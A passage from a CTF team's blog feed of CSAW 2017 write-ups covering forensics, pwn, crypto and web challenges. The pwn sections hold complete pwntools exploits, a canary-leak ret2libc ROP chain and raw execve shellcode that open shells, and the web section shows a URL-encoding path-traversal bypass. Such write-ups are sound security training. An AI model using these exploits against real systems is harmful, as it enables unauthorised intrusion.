Router","slug":"Forensics-CSAW-Best-Router","date":"2017-09-19T09:34:16.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2017/09/19/Forensics-CSAW-Best-Router/","link":"","permalink":"https://teamrocketist.github.io/2017/09/19/Forensics-CSAW-Best-Router/","excerpt":"","text":"Best Router http://forensics.chal.csaw.io:3287 NOTE: This will expand to ~16GB! 19:00 Eastern: updated. Old flags have been removed. Forensics challenge we have an img with 16GB, and an online service at http://forensics.chal.csaw.io:3287, the service asks for a username and a password so we guessed we need to find them in the img, so lets use autopsy to search in the linux filesystem for filenames that contain the word flag: As we can see we can found a /var/www/flag.txt unfortunately the file is empty, but we have the files of the web service of the link provided! Checking the username.txt and password.txt we can see that we have the username and password! After using the credentials on the web page we got the flag!","categories":[{"name":"Forensics","slug":"Forensics","permalink":"https://teamrocketist.github.io/categories/Forensics/"}],"tags":[{"name":"csaw","slug":"csaw","permalink":"https://teamrocketist.github.io/tags/csaw/"},{"name":"forensics","slug":"forensics","permalink":"https://teamrocketist.github.io/tags/forensics/"},{"name":"partitions","slug":"partitions","permalink":"https://teamrocketist.github.io/tags/partitions/"},{"name":"disk","slug":"disk","permalink":"https://teamrocketist.github.io/tags/disk/"},{"name":"autopsy","slug":"autopsy","permalink":"https://teamrocketist.github.io/tags/autopsy/"}]},{"title":"[Forensics] CSAW - Missed Registration","slug":"Forensics-CSAW-Missed-Registration","date":"2017-09-19T09:34:16.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2017/09/19/Forensics-CSAW-Missed-Registration/","link":"","permalink":"https://teamrocketist.github.io/2017/09/19/Forensics-CSAW-Missed-Registration/","excerpt":"","text":"Missed RegistrationIt’s registration day! These forms just seem longer and longer…UPDATE 10:44 Eastern: New pcap that should be a bit easier to work with.UPDATE 2:58 Eastern: We’re regenerating due to flag leaks, submissions disabled until then. Please be patient.Update 3:31 Eastern: Updated pcap with new flag after leak. Please re-run your solutions on the file!https://ctf.csaw.io/files/bd2d3bcfdf09f06728d81d1a0cc0e4ff/cap.pcap We have a pcap file, at first we saw alot of HTTP POST requests: A lot of the form fields were filled with crap information in latin, at first we thought the parameter n was encrypted or some other kind of binary we extracted but we found nothing. After awhile instead of looking at HTTP form URL encoded tab from writeshark we started looking at TCP segment data and we found a new post param, a “x” parameter that only showed up in some of the requests: The very first HTTP POST requests has this value: 1&amp;x=424d923500000000000036040000280000004301000027000000010008000000000000000000c40e0000c40e00000001000000010000000001ff0c0e10ff0d1012ff131719ff161d21ff1b2226ff1c2b33ff1f313bff24292bff252c31ff2a3338ff33393bff243742ff283741ff the beginning of this value “424d” indicated us that this might be an bmp image file! so we extracted all x’s values in one line bash command!: 1tshark -r cap.pcap -Y \"http &amp;&amp; tcp.payload contains \\\"&amp;x=\\\"\" -Tfields -e tcp.segment_data | tr -d ':|\\n' | xxd -r -p | tr -d 'x=' | xxd -r -p &gt; img.bmp","categories":[{"name":"Forensics","slug":"Forensics","permalink":"https://teamrocketist.github.io/categories/Forensics/"}],"tags":[{"name":"csaw","slug":"csaw","permalink":"https://teamrocketist.github.io/tags/csaw/"},{"name":"forensics","slug":"forensics","permalink":"https://teamrocketist.github.io/tags/forensics/"},{"name":"pcap","slug":"pcap","permalink":"https://teamrocketist.github.io/tags/pcap/"},{"name":"bmp","slug":"bmp","permalink":"https://teamrocketist.github.io/tags/bmp/"}]},{"title":"[Pwn] CSAW - scv","slug":"Pwn-CSAW-scv","date":"2017-09-18T20:59:25.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2017/09/18/Pwn-CSAW-scv/","link":"","permalink":"https://teamrocketist.github.io/2017/09/18/Pwn-CSAW-scv/","excerpt":"","text":"SCVSCV is too hungry to mine the minerals. Can you give him some food?nc pwn.chal.csaw.io 3764 IntroductionThe binary is pretty simple to read we have 3 options, option 1 is to feed the SCV which is just filling a buffer with string from stdin, option 2 prints the string using puts so no format string vulnerability possible here, option 3 is to exit the program. Pretty simple but where is the vulnerability? We can see the number of bytes in the parameters of read function is bigger than what the buffer can handle so we have a buffer overflow vulnerability but the real problem is how are we going to bypass this protections?: NX is enabled so the stack is not executable! we can bypass this easily using return-oriented-programming(ROP), butanother stack protection is enabled too which is the stack canary, we need to find away to leak addresses from the stack! but how do we do this? As we can see above the read function is reading the buf from STDIN, and what can we know about read? This function doesn’t put a null byte at the end of the read string, this awesome ! and why? because latter with option 2 puts will print the string until it finds a null byte, we can use this to our advantage to leak addresses from libc from the stack and even the stack canary itself! We just need to use gdb and look up the memory! The plan is pretty simple: 121 - Leak libc addresses and stack canary2 - Overflow the buffer and return to libc Leak libc addresses and stack canaryLets do some debugging with gdb lets put a break point right before the read occurs and check the values of the buffer before being filled: As we can see there is a libc address in stack 0x00007f2cea4aabe9 we can count it easily how much we need to fill the buffer to print that address! and we need 40 bytes.Writing the code to do this is very simple can be built in a function like this: 12345678910111213141516171819202122232425def readAddressFromTheStack(size, bytes_to_read, offset=0): \"\"\" Args: size (int): number of characters to send to the stack. bytes_to_read (int): number of bytes to read from the stack we want to leak. offset (int): number to subtract if we want to adjust the leaked address. (Optional) Returns: int: returns an address leaked from the stack. \"\"\" # Write a certain number of bytes to leak an address r.recvuntil('&gt;&gt;') r.sendline('1') r.recvuntil('&gt;&gt;') r.sendline('A'*size) # Read it from the stack print r.recvuntil('&gt;&gt;') r.sendline('2') r.recvuntil('[*]PLEASE TREAT HIM WELL.....') r.recvline() r.recvline() r.recv(size) return u64(r.recv(bytes_to_read).ljust(8, '\\x00'))-offset So what to do with this address? we can calculate its offset to system for example! we can get the system address to calculate the offset and subtract the both values: Implementing this in python would be like this: 1234567891011# Get a libc address from the stackLEAKED = readAddressFromTheStack(40, 6, -0x8f)SYSTEM = LEAKED + 0xb0f7LIBCBASE = SYSTEM -libc.symbols['system']BINSH_OFFSET = 0x18cd17 # strings -a -t x libc-2.23.so | grep '/bin/sh'BINSH = LIBCBASE + BINSH_OFFSETlog.info(\"LEAKED LIBC 0x%x\" % LEAKED)log.info(\"SYSTEM LIBC 0x%x\" % SYSTEM)log.info(\"LIBCBASE LIBC 0x%x\" % LIBCBASE)log.info(\"BINSH ADDRESS 0x%x\" % BINSH) The 3rd argument of readAddressFromTheStack is adjusting the address because in the read we are reading 40 bytes plus the new line character ‘\\n’ because to send to the server we need to press enter, I could actually instead of sending 40 bytes in the padding we could just send 39 and the number would be right but I got lazy during the CTF so instead of fixing that I just readjust the address, the leaked address will always be overwritten with 0x0a which is ‘\\n’ Ascii code representation, so as I said before it needs some adjusting. Stack canaryNow that we have everything we need for libc we just need to get the stack canary address! to check where its being stored we can look at the very beginning of the main function From radare2 we can check it is being stored at local_8h which is a friendly name to be more readable in reality thinking it in assembly it’s stored in RBP-0x8 where RBP is the baseframe pointer. So lets check again in gdb, put a break point right before the read function and print the RBP-0x8 to see the stack canary value: Here is the code to get the stack canary from the stack: 123# leak STACK CANARYSTACK_CANARY = readAddressFromTheStack(40+8*16, 8, 0x0A)log.info(\"STACK CANARY 0x%x\" % STACK_CANARY) Overflow the buffer and return to libcWe already have everything we need we just need to jump to libc rewrite the stack canary where it should be and remember we can’t forget to choose option 3 to exit the program, otherwise we never execute the ret assembly instruction and jump to system(&quot;/bin/sh&quot;);: 1234567891011121314151617181920212223ROPCHAIN = ''ROPCHAIN += p64(POPRET)ROPCHAIN += p64(BINSH)ROPCHAIN += p64(SYSTEM)padding3 = 'A'*(40+8*16)+p64(STACK_CANARY)+ 'AAAAAAAA' + ROPCHAIN#rewrite old addressesr.recvuntil('&gt;&gt;')r.sendline('1')r.recvuntil('&gt;&gt;')r.sendline(padding3)# exitingprint r.recvuntil('&gt;&gt;')r.sendline('3')print r.recvuntil('[*]BYE ~ TIME TO MINE MIENRALS...')r.interactive()#time.sleep(10)r.close() The full exploit: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889from pwn import *import timedef getConn(): return process('./scv', env = &#123;\"LD_PRELOAD\":'./libc-2.23.so'&#125;) if local else remote('pwn.chal.csaw.io', 3764)def readAddressFromTheStack(size, bytes_to_read, offset=0): \"\"\" Args: size (int): number of characters to send to the stack. bytes_to_read (int): number of bytes to read from the stack we want to leak. offset (int): number to subtract if we want to adjust the leaked address. (Optional) Returns: int: returns an address leaked from the stack. \"\"\" # Write a certain number of bytes to leak LIBC r.recvuntil('&gt;&gt;') r.sendline('1') r.recvuntil('&gt;&gt;') r.sendline('A'*size) # Read from the stack print r.recvuntil('&gt;&gt;') r.sendline('2') r.recvuntil('[*]PLEASE TREAT HIM WELL.....') r.recvline() r.recvline() r.recv(size) return u64(r.recv(bytes_to_read).ljust(8, '\\x00'))-offset local = Falsebinary = ELF('./scv')libc = ELF('./libc-2.23.so')r = getConn()# b *0x00400aae#gdb.attach(r, '''#b *0x00400cce#b *0x00400cd3#b *0x00400ddf#b *0x00400d94#b *0x400d8f#b *0x00400dce#c''')# Get a libc address from the stackLEAKED = readAddressFromTheStack(40, 6, -0x8f)SYSTEM = LEAKED + 0xb0f7LIBCBASE = SYSTEM -libc.symbols['system']BINSH_OFFSET = 0x18cd17 # strings -a -t x libc-2.23.so | grep '/bin/sh'BINSH = LIBCBASE + BINSH_OFFSETPOPRET = 0x0000000000400ea3 # ROPgadget --binary ./scv --only \"pop|ret\"log.info(\"LEAKED LIBC 0x%x\" % LEAKED)log.info(\"SYSTEM LIBC 0x%x\" % SYSTEM)log.info(\"LIBCBASE LIBC 0x%x\" % LIBCBASE)log.info(\"BINSH ADDRESS 0x%x\" % BINSH)r.recv(1) # new line# leak STACK CANARYSTACK_CANARY = readAddressFromTheStack(40+8*16, 8, 0x0A)log.info(\"STACK CANARY 0x%x\" % STACK_CANARY)ROPCHAIN = ''ROPCHAIN += p64(POPRET)ROPCHAIN += p64(BINSH)ROPCHAIN += p64(SYSTEM)padding3 = 'A'*(40+8*16)+p64(STACK_CANARY)+ 'AAAAAAAA' + ROPCHAIN#rewrite old addressesr.recvuntil('&gt;&gt;')r.sendline('1')r.recvuntil('&gt;&gt;')r.sendline(padding3)# exitingprint r.recvuntil('&gt;&gt;')r.sendline('3')print r.recvuntil('[*]BYE ~ TIME TO MINE MIENRALS...')r.interactive()r.close() Running it and get the flag: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051$ python scv.py[*] '~/ctf/csaw/pwn/scv/scv' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000)[*] '~/ctf/csaw/pwn/scv/libc-2.23.so' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled[+] Opening connection to pwn.chal.csaw.io on port 3764: Done-------------------------[*]SCV GOOD TO GO,SIR....-------------------------1.FEED SCV....2.REVIEW THE FOOD....3.MINE MINERALS....-------------------------&gt;&gt;[*] LEAKED LIBC 0x7fe343297299[*] SYSTEM LIBC 0x7fe3432a2390[*] LIBCBASE LIBC 0x7fe34325d000[*] BINSH ADDRESS 0x7fe3433e9d17-------------------------[*]SCV GOOD TO GO,SIR....-------------------------1.FEED SCV....2.REVIEW THE FOOD....3.MINE MINERALS....-------------------------&gt;&gt;[*] STACK CANARY 0x49b1940e5e5ffe00-------------------------[*]SCV GOOD TO GO,SIR....-------------------------1.FEED SCV....2.REVIEW THE FOOD....3.MINE MINERALS....-------------------------&gt;&gt;[*]BYE ~ TIME TO MINE MIENRALS...[*] Switching to interactive mode$ lsflagscv$ cat flagflag&#123;sCv_0n1y_C0st_50_M!n3ra1_tr3at_h!m_we11&#125;","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"x64","slug":"Pwn/x64","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/"},{"name":"Stack Issue","slug":"Pwn/x64/Stack-Issue","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/"},{"name":"Stack Overflow","slug":"Pwn/x64/Stack-Issue/Stack-Overflow","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/Stack-Overflow/"},{"name":"Canary Leak","slug":"Pwn/x64/Stack-Issue/Canary-Leak","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/Canary-Leak/"}],"tags":[{"name":"csaw","slug":"csaw","permalink":"https://teamrocketist.github.io/tags/csaw/"},{"name":"pwn","slug":"pwn","permalink":"https://teamrocketist.github.io/tags/pwn/"},{"name":"stack_overflow","slug":"stack-overflow","permalink":"https://teamrocketist.github.io/tags/stack-overflow/"},{"name":"stackcanary","slug":"stackcanary","permalink":"https://teamrocketist.github.io/tags/stackcanary/"}]},{"title":"[Pwn] CSAW - Pilot","slug":"Pwn-CSAW-Pilot","date":"2017-09-18T20:58:25.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2017/09/18/Pwn-CSAW-Pilot/","link":"","permalink":"https://teamrocketist.github.io/2017/09/18/Pwn-CSAW-Pilot/","excerpt":"","text":"pilotCan I take your order?nc pwn.chal.csaw.io 846416:05 Eastern: Updated binary Simple bufferoverflow , we actually have a read size of 0x40 stack the binary doesn’t have any kind of protections so it’s a very easy one, just a simple buffer overflow, we even get the buffer address to jump! The plan is: 12341 - Caculate the offset to overflow.2 - Extract the address of the buffer.3 - Insert nops at the beginning and then shell code, the rest of the buffer fill it with A or any other values4 - Modify the return address with the value of the beginning of the buffer Visual representation of the stack! How the stack looks like in gdb! 1234pwndbg&gt; x/20g 0x7ffef19136600x7ffef1913660: 0xbf48f63190909090 0xff978cd091969dd1 0x7ffef1913670: 0x573b04e6f7dff748 0x41414141050f5f54 0x7ffef1913680: 0x4141414141414141 0x00007ffef1913660 The offset is 40 bytes to overflow the code is very simple 123456789101112131415161718192021222324252627from pwn import *def getConn(): return process('pwn/pilot') if local else remote('pwn.chal.csaw.io', 8464) binary = ELF('pwn/pilot')local = Falser = getConn()#db.attach(r, '''#break *0x0000000000400b35#c''')r.recvuntil('[*]Good Luck Pilot!....\\n')nops = '\\x90'*4shellcode = \"\\x31\\xf6\\x48\\xbf\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdf\\xf7\\xe6\\x04\\x3b\\x57\\x54\\x5f\\x0f\\x05\"padding = 'A'* (40 - len(nops)- len(shellcode)) BUFFER = int(r.recvline()[12:],0)log.info(\"LEAKED BUFFER 0x%x\" % BUFFER)r.recvuntil('[*]Command:')r.sendline(nops+ shellcode + padding+ p64(BUFFER))r.interactive()r.close() Running it 12345678910111213141516$ python pilot.py[*] '~/ctf/csaw/pwn/pilot' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments[+] Opening connection to pwn.chal.csaw.io on port 8464: Done[*] LEAKED BUFFER 0x7ffc2562d050[*] Switching to interactive mode$ lsflagpilot$ cat flagflag&#123;1nput_c00rd1nat3s_Strap_y0urse1v3s_1n_b0ys&#125;","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"x64","slug":"Pwn/x64","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/"},{"name":"Stack Issue","slug":"Pwn/x64/Stack-Issue","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/"},{"name":"Stack Overflow","slug":"Pwn/x64/Stack-Issue/Stack-Overflow","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/Stack-Overflow/"}],"tags":[{"name":"csaw","slug":"csaw","permalink":"https://teamrocketist.github.io/tags/csaw/"},{"name":"pwn","slug":"pwn","permalink":"https://teamrocketist.github.io/tags/pwn/"},{"name":"stack_overflow","slug":"stack-overflow","permalink":"https://teamrocketist.github.io/tags/stack-overflow/"},{"name":"shellcode","slug":"shellcode","permalink":"https://teamrocketist.github.io/tags/shellcode/"}]},{"title":"Crypto-CSAW-CTF-2017-Baby-Crypt","slug":"Crypto-CSAW-CTF-2017-Baby-Crypt","date":"2017-09-18T17:19:10.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2017/09/18/Crypto-CSAW-CTF-2017-Baby-Crypt/","link":"","permalink":"https://teamrocketist.github.io/2017/09/18/Crypto-CSAW-CTF-2017-Baby-Crypt/","excerpt":"","text":"baby_cryptThe cookie is input + flag AES ECB encrypted with the sha256 of the flag as the key.nc crypto.chal.csaw.io 1578 The first step that we took was to find out how many AES 16 byte blocks that the flag has.To measure this we simply sent an empty request to the service. 123DiogoMonteiro @ ~/baby_crypt -&gt; nc crypto.chal.csaw.io 1578Enter your username (no whitespace):Your Cookie is: f9cc1330ae5830732a18d1a23211ffbce3725519adb9e6f10d658d87c80825ed At this stage, and having a hex string with 64 chars, we know that the flag has 32 bytes (including any padding).Therefore, the flag represents two AES 16 byte blocks. From the challenge description we know that the encryption is performed using AES ECB, which is vulnerable to chosen plaintext attacks. As a matter of fact, we have control over the first (any) bytes of the plaintext.With a chosen plaintext attack on AES, to find the 32 bytes of the flag, we need to brute force each one of its bytes, resulting in a search space with size 32 x 94 = 3008 chars, which is easy. The chosen plaintext attack that we performed works as follows. The idea is to input 32 bytes where the last byte is the one that we are going to brute force. We start by sending to the service the input = AAAAAAAAAAAAAAAX (16 chars) for each char X in the range of printable chars, and store the resulting ciphertext of the second block in a dictionary D1. 12345678910(X = byte to brute force, ! = byte of the secret, P = padding byte)| AAAAAAAAAAAAAAAA | AAAAAAAAAAAAAAAX | !!!!!!!!!!!!!!!! | !!!!!!!!!!!!!!!! | for each X in 0x20 to 0x7E| ---------------input ---------------| --------------secret ---------------|D1 = &#123; &apos;cipher(AAAAAAAAAAAAAAAa)&apos;: &apos;a&apos;, &apos;cipher(AAAAAAAAAAAAAAAb)&apos;: &apos;b&apos;, ...&#125; To find the first character of the flag, we compute the ciphertext of the second block with input = AAAAAAAAAAAAAAA (15 chars) and lookup for that ciphertext in the dictionary D1. The next round is similar.For each byte X in the range of printable chars we send input = AAAAAAAAAAAAAAfX (16 chars, and notice the previously found “f” char) to the server and store the resulting ciphertext of the second block in a dictionary D2. 12345678| AAAAAAAAAAAAAAAA | AAAAAAAAAAAAAAfX | !!!!!!!!!!!!!!!! | !!!!!!!!!!!!!!!P || ---------------input ---------------|D2 = &#123; &apos;cipher(AAAAAAAAAAAAAAfa)&apos;: &apos;a&apos;, &apos;cipher(AAAAAAAAAAAAAAfb)&apos;: &apos;b&apos;, ...&#125; Giving input = AAAAAAAAAAAAAAf to the server and looking up in the dictionary D2, we find the second letter of the flag. And so on. The following code implements the attack. 12345678910111213141516171819202122232425262728from pwn import *conn = remote(\"crypto.chal.csaw.io\", 1578)def oracle(chosen): conn.send(chosen + \"\\n\") return conn.recvline().split(\" \")[-1].rstrip(\"\\n\")def second_block(blocks): return blocks[32:64]found = \"\"for j in range(32): d = &#123;&#125; b = (\"A\" * (31-j)) + found for i in range(0x20, 0x7E): chosen = b + chr(i) blocks = oracle(chosen) d[second_block(blocks)] = chr(i) print \".\", n = oracle(\"A\" * (31-j)) found += d[second_block(n)] print foundprint found After running it, we get the flag: 1234567891011121314151617181920212223242526272829303132333435363738..............................................................................................f..............................................................................................fl..............................................................................................fla..............................................................................................flag..............................................................................................flag&#123;..............................................................................................flag&#123;C..............................................................................................flag&#123;Cr..............................................................................................flag&#123;Cry..............................................................................................flag&#123;Cryp..............................................................................................(truncated output)flag&#123;Crypt0_is_s0_h@rd_t0..............................................................................................flag&#123;Crypt0_is_s0_h@rd_t0_..............................................................................................flag&#123;Crypt0_is_s0_h@rd_t0_d..............................................................................................flag&#123;Crypt0_is_s0_h@rd_t0_d0..............................................................................................flag&#123;Crypt0_is_s0_h@rd_t0_d0...............................................................................................flag&#123;Crypt0_is_s0_h@rd_t0_d0................................................................................................flag&#123;Crypt0_is_s0_h@rd_t0_d0.................................................................................................flag&#123;Crypt0_is_s0_h@rd_t0_d0...&#125;flag&#123;Crypt0_is_s0_h@rd_t0_d0...&#125; Very fun challenge!","categories":[{"name":"Crypto","slug":"Crypto","permalink":"https://teamrocketist.github.io/categories/Crypto/"}],"tags":[{"name":"crypto","slug":"crypto","permalink":"https://teamrocketist.github.io/tags/crypto/"},{"name":"csaw","slug":"csaw","permalink":"https://teamrocketist.github.io/tags/csaw/"},{"name":"aes","slug":"aes","permalink":"https://teamrocketist.github.io/tags/aes/"},{"name":"ecb","slug":"ecb","permalink":"https://teamrocketist.github.io/tags/ecb/"}]},{"title":"[Crypto] CSAW 2017 - Another Xor","slug":"Crypto-CSAW-CTF-2017-Another-Xor","date":"2017-09-18T16:46:30.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2017/09/18/Crypto-CSAW-CTF-2017-Another-Xor/","link":"","permalink":"https://teamrocketist.github.io/2017/09/18/Crypto-CSAW-CTF-2017-Another-Xor/","excerpt":"","text":"Another XorHey, hey can you find my secret.https://ctf.csaw.io/files/ef303796b276cd0bdf4f7c61b2606df5/cipher.pyhttps://ctf.csaw.io/files/02a457c28ec0b04e5f7118e54ac8e138/encrypted Our first attempt to solve this challenge was to use xortool. However, it was a dead end. By looking at the given code we understand the cipher is just xoring with a repeated key. As a consequence, the second try was to perform a known-plaintext attack on recover a part of the key. We know the first bytes of the plaintext, which are “flag{“.We can xor the first 5 bytes of the ciphertext with “flag{“ to get the first 5 bytes of the key. The result is “A qua”. The next step is to find the key length. We know that the last 16 bytes are from a hex encoded md5 hash, so ourstrategy was to try several key lengths while decrypting with the bytes “A qua” that we know. By looking at the partial decrypted values we can find possible key lengths where the resulting chars are printable and the last ones are in hexadecimal. The code used to find the key length was the following: 1234567891011121314151617181920with open(\"encrypted\", \"r\") as f: c = f.read()key = \"A qua\"for j in range(5, 100): keyz = key + (\"&lt;\" * (j - len(key))) print cz = \"\" print \"Trying with keysize of \" + str(len(keyz)) for i in range(len(c)): if keyz[i%len(keyz)] != \"&lt;\": cz += chr(ord(c[i]) ^ ord(keyz[i%len(keyz)])) else: # we still do not have that portion of the key cz += \"?\" print \"plaintext: \" + cz[0:len(cz)-32-len(keyz)] print \"key: \" + cz[len(cz)-32-len(keyz): len(cz)-32] print \"md5: \" + cz[len(cz)-32:] Key-length 67 was one of the few that the last 16 bytes were hex chars. We noticed this: 1234trying with keysize of 67plaintext: flag&#123;?????????????????????????????????key: ????????????????????????????? zinc?????????????????????????????????md5: ?????????????????????????????df2 Lets try with key-length 67.As the ciphertext contains the encryption of the key, it is possible to iteratively find more bytes of the key.This is what implemented to find the flag: 123456789101112131415161718192021with open(\"encrypted\", \"r\") as f: c = f.read()keyz = \"A qua??????????????????????????????????????????????????????????????\"print \"trying with key of length %d\" % len(keyz)while \"?\" in keyz: cz = \"\" for i in range(len(c)): if keyz[i%len(keyz)] != \"?\": cz += chr(ord(c[i]) ^ ord(keyz[i%len(keyz)])) else: cz += \"?\" print \"Partial key --&gt; \" + keyz ak = cz[len(cz)-32-len(keyz): len(cz)-32] keyz = \"A qua\" + ak[5:] # the first 5 bytes we already knowprint \"plaintext: \" + cz[0:len(cz)-32-len(keyz)]print keyz With this, we got the flag: 12345678910111213141516171819202122232425trying with key of length 67Partial key --&gt; A qua??????????????????????????????????????????????????????????????Partial key --&gt; A qua???????????????????????? zinc?????????????????????????????????Partial key --&gt; A qua???????????????????????? zinc????????????????????????ht pa????Partial key --&gt; A qua???????????????ixed ???? zinc????????????????????????ht pa????Partial key --&gt; A qua???????????????ixed ???? zinc???????????????very ????ht pa????Partial key --&gt; A qua?????? of o????ixed ???? zinc???????????????very ????ht pa????Partial key --&gt; A qua?????? of o????ixed ???? zinc?????? make????very ????ht pa????Partial key --&gt; A quart???? of o????ixed ???? zinc?????? make????very ????ht pa????Partial key --&gt; A quart???? of o????ixed ???? zinc o???? make????very ????ht pa????Partial key --&gt; A quart???? of o????ixed ???? zinc o???? make????very ????ht pain??Partial key --&gt; A quart???? of o????ixed wi?? zinc o???? make????very ????ht pain??Partial key --&gt; A quart???? of o????ixed wi?? zinc o???? make????very br??ht pain??Partial key --&gt; A quart???? of oil??ixed wi?? zinc o???? make????very br??ht pain??Partial key --&gt; A quart???? of oil??ixed wi?? zinc o???? makes ??very br??ht pain??Partial key --&gt; A quart j?? of oil??ixed wi?? zinc o???? makes ??very br??ht pain??Partial key --&gt; A quart j?? of oil??ixed wi?? zinc oxi?? makes ??very br??ht pain??Partial key --&gt; A quart j?? of oil??ixed wi?? zinc oxi?? makes ??very br??ht paint|Partial key --&gt; A quart j?? of oil??ixed with zinc oxi?? makes ??very br??ht paint|Partial key --&gt; A quart j?? of oil??ixed with zinc oxi?? makes ??very bright paint|Partial key --&gt; A quart j?? of oil mixed with zinc oxi?? makes ??very bright paint|Partial key --&gt; A quart j?? of oil mixed with zinc oxi?? makes a very bright paint|Partial key --&gt; A quart jar of oil mixed with zinc oxi?? makes a very bright paint|plaintext: flag&#123;sti11_us3_da_x0r_for_my_s3cratz&#125;|A quart jar of oil mixed with zinc oxide makes a very bright paint| Very nice challenge.","categories":[{"name":"Crypto","slug":"Crypto","permalink":"https://teamrocketist.github.io/categories/Crypto/"}],"tags":[{"name":"crypto","slug":"crypto","permalink":"https://teamrocketist.github.io/tags/crypto/"},{"name":"xor","slug":"xor","permalink":"https://teamrocketist.github.io/tags/xor/"},{"name":"csaw","slug":"csaw","permalink":"https://teamrocketist.github.io/tags/csaw/"}]},{"title":"[Web] CSAW - orange v3","slug":"Web-CSAW-orange-v3","date":"2017-09-18T03:48:13.000Z","updated":"2022-08-23T00:14:55.169Z","comments":true,"path":"2017/09/18/Web-CSAW-orange-v3/","link":"","permalink":"https://teamrocketist.github.io/2017/09/18/Web-CSAW-orange-v3/","excerpt":"","text":"orange v3I wrote a little proxy program in NodeJS for my poems folder but I’m bad at programming so I had to rewrite it. Again.I changed up flag.txt too but everyone still wants to read it…http://web.chal.csaw.io:7312/?path=orange.txt Keep in mind I didn’t solve this challenge during the CTF but I was pretty close, the way to do this was to use unicode characters, I gave up in mid way after trying alot of characters and gave up and started thinking there was another way of bypassing the new filters! but It didn’t, the reason why I’m doing the writeup is to explain why some approaches don’t work and others do, this write up is based after reading dcua writeup , so all the credits go to them! AnalysisSame problem as orange v1 after testing a bunch of characters and see which ones were giving a 404 error BANNED and now our string must have “.txt“ at the end of the string so we are “stuck” into a one extension: 1r\".|#|%\" # --&gt; if the path GET parameter has any of this characters will return a 404 Note that even null bytes don’t work here because the string must always end with “.txt“. Double url encoding approachDouble url encoding no longer works and why? because the character “%“ is banned, so imagine that we try to inject this %202e the nodejs UrlParse function will decode it first into “%2e“ and the black list filter will block it because it contains a “%2e“! Why are they banning # characterRemember the code from orange v1? 12var path = url.parse(req.url, true).query;path = path['path']; They are using url.parse! url parse in nodejs works the same way that php one works, here what happens when you add # character in php for example: 12345678910111213$ php -r \"var_dump(parse_url('web.chal.csaw.io:7312/?path=hi#.txt'));\"array(5) &#123; [\"host\"]=&gt; string(16) \"web.chal.csaw.io\" [\"port\"]=&gt; int(7312) [\"path\"]=&gt; string(1) \"/\" [\"query\"]=&gt; string(10) \"path=hello\" [\"fragment\"]=&gt; string(4) \".txt\"&#125; You can see the trick? yes if the programmer uses the query parameter he’s fucked! everything after the ‘#’ will go to the field “fragment“! And the string won’t have the “.txt“ in the end of the string! Same thing in nodejs: 123var url = require('url');console.log(url.parse('web.chal.csaw.io:7312/?path=hi#.txt', true).query);// &#123; path: 'hi' &#125; Bypassing the extension filterWell if “#” removes everything after it how do we bypass the extension? well lets do the obvious lets encode “#” 12345678910111213141516$ curl 'web.chal.csaw.io:7312/?path=%23.txt'&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"&gt;&lt;html&gt;&lt;title&gt;Directory listing for /poems/&lt;/title&gt;&lt;body&gt;&lt;h2&gt;Directory listing for /poems/&lt;/h2&gt;&lt;hr&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=\"burger.txt\"&gt;burger.txt&lt;/a&gt;&lt;li&gt;&lt;a href=\"haiku.txt\"&gt;haiku.txt&lt;/a&gt;&lt;li&gt;&lt;a href=\"orange.txt\"&gt;orange.txt&lt;/a&gt;&lt;li&gt;&lt;a href=\"ppp.txt\"&gt;ppp.txt&lt;/a&gt;&lt;li&gt;&lt;a href=\"the_red_wheelbarrow.txt\"&gt;the_red_wheelbarrow.txt&lt;/a&gt;&lt;/ul&gt;&lt;hr&gt;&lt;/body&gt;&lt;/html&gt; It works! url.parse won’t remove the #, and after this nodejs will make a request at an url, and a GET request ignores everything after a #.Now I will teach another way to bypass this but with another character “?“ or its url encoded version “%3F“: url.parse will do this:123var url = require('url');console.log(url.parse('web.chal.csaw.io:7312/?path=hi?.txt', true).query);// &#123; path: 'hi?.txt' &#125; WTH? if it isn’t the url parse what is happening here? 12345678910var callback = function(response)&#123;var str = '';response.on('data', function (chunk) &#123; str += chunk;&#125;);response.on('end', function () &#123; res.end(str);&#125;);&#125;;http.get(base + path, callback).end(); Yap it’s the http.get function, yes a GET request will ignore everything that is after a ? and this works because this isn’t Local File Inclusion function like include in php but a HTTP REQUEST! amazing isn’t it? Bypassing the “.“ filterEverything else is blocked so the only thing that is left is unicode! You could find all UTF-16 characters at here and the character was this one http://www.fileformat.info/info/unicode/char/012e/index.htm It works! now getting the 